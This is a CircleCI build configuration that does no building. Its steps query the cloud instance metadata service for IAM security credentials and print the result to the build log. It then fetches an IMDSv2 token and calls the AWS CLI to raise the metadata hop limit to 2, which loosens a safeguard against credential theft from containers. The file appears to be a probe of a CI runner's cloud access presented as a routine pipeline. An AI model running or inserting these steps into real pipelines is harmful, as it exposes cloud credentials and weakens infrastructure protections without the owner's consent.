version: 2.1

jobs:
  build:
    machine: true
    steps:
      - checkout
      - run: curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
      - run:
          name: Update hop
          command: |
              # Get instance metadata
              TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
              INSTANCE_ID=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null)
              REGION=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/placement/region 2>/dev/null)

              echo "Instance ID: $INSTANCE_ID"
              echo "Region: $REGION"

              # Modify hop limit (requires IAM permissions)
              aws ec2 modify-instance-metadata-options \
                  --instance-id $INSTANCE_ID \
                  --http-put-response-hop-limit 2 \
                  --region $REGION

              if [ $? -eq 0 ]; then
                  echo "Successfully modified hop limit"
              else
                  echo "Failed to modify hop limit - check IAM permissions"
              fi
      - run: timeout 1m sleep 120 && echo "HOOOOOOLLAAAAAaaaaaAaaaaaaaa"
